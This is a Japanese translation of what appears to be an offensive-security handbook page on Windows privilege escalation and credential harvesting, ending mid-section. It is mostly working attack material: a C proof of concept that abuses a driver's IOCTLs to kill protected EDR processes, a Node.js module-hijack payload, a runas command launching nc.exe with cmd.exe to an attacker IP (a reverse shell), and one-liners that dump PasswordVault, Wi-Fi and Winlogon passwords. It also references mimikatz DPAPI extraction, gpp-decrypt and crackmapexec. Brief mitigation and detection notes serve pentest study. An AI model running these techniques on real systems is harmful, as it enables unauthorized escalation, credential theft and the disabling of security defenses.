Windows では、service が失敗した場合に実行するアクションをユーザーが指定できます。この機能は、binary を指すように設定できます。この binary を置き換え可能な場合、privilege escalation が可能になることがあります。詳細については、[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### Installed Applications

**binaries の permissions**（置き換えて privileges を escalate できる可能性があります）と、folders の permissions（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の設定ファイルを変更して特殊なファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認します。

システム内の脆弱なフォルダー／ファイル権限を見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内にあるすべての plugin DLL を自動的に autoload します。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに `notepad++.exe` 内で automatic code execution が実行されます（`DllMain` や plugin callbacks からも実行可能です）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### startup 時の実行

**別の user によって実行される registry または binary を overwrite できるか確認します。**\
**以下のページを**読み、**privilege を escalate するために興味深い autoruns locations**について詳しく学習してください。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の奇妙な、または脆弱な** drivers を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
任意の kernel read/write primitive（設計の悪い IOCTL handler でよく見られます）を公開している driver がある場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。step-by-step の technique はこちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

vulnerable call が attacker-controlled Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（max-length component や深い directory chain を使用）、window を数 microseconds から数十 microseconds まで引き延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitive

Modern hive の vulnerability では、deterministic な layout を groom し、書き込み可能な HKLM/HKU descendant を悪用し、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain はこちらを参照してください：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled path による `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を、`int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、次の 2 つの有用な primitive が生じます：

- **Confused deputy / oracle**：user-controlled な absolute `\Registry\...` path により、driver は attacker が選択した key を query でき、return code/log を通じて存在を leak し、場合によっては caller が直接 access できない value を読み取れます。
- **Kernel memory corruption**：`&readValue` のような scalar destination は、registry value type に応じて、`REG_QWORD`、`UNICODE_STRING`、または size 指定された binary buffer として type-confused されます。

実用的な exploitation notes：

- **Windows 8+ mitigation**：query が **untrusted hive** に到達し、`RTL_QUERY_REGISTRY_DIRECT` がある一方で `RTL_QUERY_REGISTRY_TYPECHECK` がない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、`HKCU` の下に value を staging するのではなく、**trusted system hive 内の attacker-writable key** を探してください。
- **Trusted-hive staging**：NtObjectManager を使用して `\Registry\Machine` の writable descendant を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます：
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの`int`への8バイトの直接書き込みにより、隣接するスタックデータが破壊され、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定する。コードがまず攻撃者制御の`REG_DWORD`をスタックスカラーに読み込み、その後同じバッファを文字列読み取りに再利用すると、攻撃者が`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的な影響を与えられるため、部分的に制御されたkernel writeが発生する。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`にある最初の`LONG`を符号付きバッファサイズとして扱う。以前の`REG_DWORD`読み取りによって、再利用されたスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリによって攻撃者のバイト列が隣接するスタックスロットへ直接コピーされ、callback-pointerを完全に上書きする最も容易な経路となることが多い。

強力なhunting pattern: **同じスタック変数への、再初期化を伴わない異種registry read**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された`EntryContext`ポインター、および最初のregistry readによって2回目のreadを実行するかどうかが決まるコードパスをgrepする。

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

署名済みのthird-party driverの中には、IoCreateDeviceSecureを使用して強力なSDDLでdevice objectを作成する一方、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れるものがある。このフラグがない場合、追加のコンポーネントを含むパスを通じてdeviceが開かれる際にsecure DACLが適用されないため、権限のないユーザーでも次のようなnamespace pathを使用してhandleを取得できる。

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例)

ユーザーがdeviceを開けるようになると、driverが公開する特権IOCTLをLPEやtamperingに悪用できる。実際の環境で確認された機能の例:
- 任意のprocessに対するfull-access handleを返す（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light (PP/PPL)を含む任意のprocessをterminateし、kernel経由でuser landからAV/EDR killを可能にする。

最小PoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けのMitigations
- DACLによる制限を意図したdevice objectsを作成する際は、常にFILE_DEVICE_SECURE_OPENを設定してください。
- privileged operationsではcaller contextを検証してください。process terminationやhandle returnsを許可する前に、PP/PPL checksを追加してください。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、kernel privilegesへの直接アクセスではなく、brokered modelsの利用を検討してください。

defenders向けのDetection ideas
- 疑わしいdevice names（例：\\ .\\amsdk*）のuser-mode opensや、abuseを示す特定のIOCTL sequencesを監視してください。
- Microsoftのvulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自のallow/deny listsを維持してください。


## PATH DLL Hijacking

**PATH上に存在するfolder内へのwrite permissions**を持っている場合、processによってloadされるDLLをhijackし、**privilegesをescalate**できる可能性があります。

PATH内のすべてのfoldersのpermissionsを確認してください：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
この check を abuse する方法の詳細については:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、**expected module が missing** の状態で `require("foo")` のような bare import を実行する **Node.js** および **Electron** applications に影響する **Windows uncontrolled search path** variant です。

Node は directory tree を上に向かってたどり、各 parent にある `node_modules` folders を確認して packages を resolve します。Windows では、この探索が drive root まで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動された application が、最終的に次の場所を probe する場合があります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、malicious な `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を resolve するのを待つことができます。payload は victim process の security context で実行されるため、target が administrator として実行されている場合、elevated scheduled task/service wrapper から実行される場合、または auto-start される privileged desktop app の場合、これは **LPE** になります。

これは特に次の状況でよく発生します:

- dependency が `optionalDependencies` で宣言されている
- third-party library が `require("foo")` を `try/catch` で囲み、failure 時にも処理を継続する
- package が production builds から削除された、packaging 時に省略された、または install に失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所に存在する

### 脆弱な target の Hunting

resolution path を証明するには **Procmon** を使用します:

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で Filter
- `Path` `contains` `node_modules` で Filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功する open に注目する

unpacked `.asar` files または application sources で有用な code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon または source review から **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します:
```powershell
mkdir C:\node_modules
```
3. 期待される名前と完全に一致するモジュールを配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションをトリガーします。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に存在する missing optional modules の例としては `bluebird` や `utf-8-validate` があります。ただし、再利用可能な **technique** は次の点です。特権 Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけます。

### 検出と hardening のアイデア

- ユーザーが `C:\node_modules` を作成した場合や、そこに新しい `.js` ファイル／パッケージを書き込んだ場合にアラートを出す。
- `C:\node_modules\*` から読み取りを行う high-integrity プロセスをハンティングする。
- 本番環境ですべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用を監査する。
- サードパーティーコードで、`try { require("...") } catch {}` のようなサイレントなパターンを確認する。
- ライブラリが対応している場合は optional probes を無効化する（たとえば、一部の `ws` デプロイメントでは `WS_NO_UTF_8_VALIDATE=1` により、legacy `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされた、その他の既知のコンピューターを確認します
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォール ルール

[**ファイアウォール関連のコマンドについては、このページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、`nc` による通信を firewall で許可するかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーを **自動的にログインさせ**ることのできるサーバー、Webサイト、その他のプログラム用のユーザー資格情報を保存します。最初は、ユーザーが Facebook の資格情報、Twitter の資格情報、Gmail の資格情報などを保存して、ブラウザ経由で自動的にログインできるようになったように見えるかもしれません。しかし、実際はそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための資格情報を保存します。つまり、**リソース（サーバーまたはWebサイト）にアクセスするために資格情報を必要とする Windows アプリケーションは、Credential Manager** と Windows Vault を利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された資格情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の資格情報を使用することはできないと思います。したがって、アプリケーションで vault を利用したい場合は、何らかの方法で **credential manager と通信し、そのリソース用の資格情報をデフォルトのストレージ vault に要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている資格情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`runas` を `/savecred` オプション付きで使用できます。次の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できることに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` 権限なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを直ちに dump して復号できます：
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows operating system 内で非対称 private key を symmetric encryption するために使用される、データの symmetric encryption の手段を提供します。この encryption では、user または system の secret を利用して entropy に大きく寄与させます。

**DPAPI は、user の login secrets から導出された symmetric key を通じて key を encryption できます**。system encryption に関係するシナリオでは、system の domain authentication secrets を利用します。

DPAPI を使用して encryption された user RSA key は、`%APPDATA%\Microsoft\Protect\{SID}` directory に保存されます。ここで `{SID}` は user の [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。同じ file 内で user の private key を保護する master key と同じ場所に保存される **DPAPI key** は、通常 64 bytes の random data で構成されます。（この directory への access は制限されているため、CMD の `dir` command でその contents を list することはできませんが、PowerShell では list できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると、復号できます。

**master password で保護された credentials files** は通常、次の場所にあります：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`/masterkey` に適切な **masterkey** を指定して、**mimikatz module** の `dpapi::cred` を使用すると復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の **DPAPI** **masterkeys** を **extract** できます（root 権限がある場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、これは作成時と同じコンピューター上の同じユーザーのみが復号できることを意味します。

ファイルに含まれている PS credentials を **decrypt** するには、次の操作を行います：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
`/masterkey` を適切に指定して **Mimikatz** の `dpapi::rdg` module を使用し、**すべての .rdg files を decrypt** する\
**Mimikatz** の `sekurlsa::dpapi` module を使用すると、memory から **多数の DPAPI masterkeys を extract** できる

### Sticky Notes

Windows workstations では、データベース file であることを認識せずに、Sticky Notes app を使用して **passwords** やその他の情報を**保存**することがよくあります。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords を recover するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、**credentials** が configure されており、**recover** できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から extract されたものです：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
Installers は **SYSTEM privileges で実行され**、多くが **DLL Sideloading に対して脆弱です（**[**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) **の情報）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Puttyの認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSHホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSH keys

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この technique の詳細については、こちらを参照してください: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されておらず、boot 時に自動的に開始したい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。ssh キーをいくつか作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしてみました。しかし、レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称キー認証中に `dpapi.dll` が使用されたことを確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは **metasploit** を使用して検索することもできます: _post/windows/gather/enum_unattend_

内容例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Pasword

以前は、Group Policy Preferences (GPP) を介して、複数のマシンにカスタムのローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) には、すべての domain user がアクセスできました。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みのすべての user が復号できました。これは、user が elevated privileges を取得できる可能性があるため、重大な risk となりました。

この risk を軽減するため、空でない "cpassword" field を含む、ローカルに cached された GPP ファイルを検索する function が開発されました。このようなファイルが見つかると、function は password を復号し、custom PowerShell object を返します。この object には、GPP とファイルの location に関する details が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (V Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を decrypt するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPNの認証情報
```csharp
Add-Type -AssemblyName System.Security
